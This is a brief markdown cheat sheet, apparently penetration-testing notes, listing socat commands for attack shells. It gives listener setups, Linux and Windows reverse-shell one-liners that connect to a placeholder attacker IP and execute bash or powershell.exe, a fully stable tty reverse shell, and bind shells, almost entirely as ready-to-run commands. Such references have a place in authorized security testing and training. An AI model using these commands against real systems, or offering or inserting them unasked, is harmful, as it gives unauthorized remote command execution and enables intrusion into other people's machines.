# Socat

## Reverse Shells

```bash
# Equivalent of netcat listener
socat TCP-L:<port> -

# Linux connection
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

# Windows connection
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

### Only for Linux: fully stable tty reverse shell. The target must have socat installed!
```bash
# Set up the listener
socat TCP-L:<port> FILE:`tty`,raw,echo=0

socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

## Bind Shells

```bash
# Linux
socat TCP-L:<PORT> EXEC:"bash -li"

# Windows
socat TCP-L:<PORT> EXEC:powershell.exe,pipes

# Connection to the bind shell
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```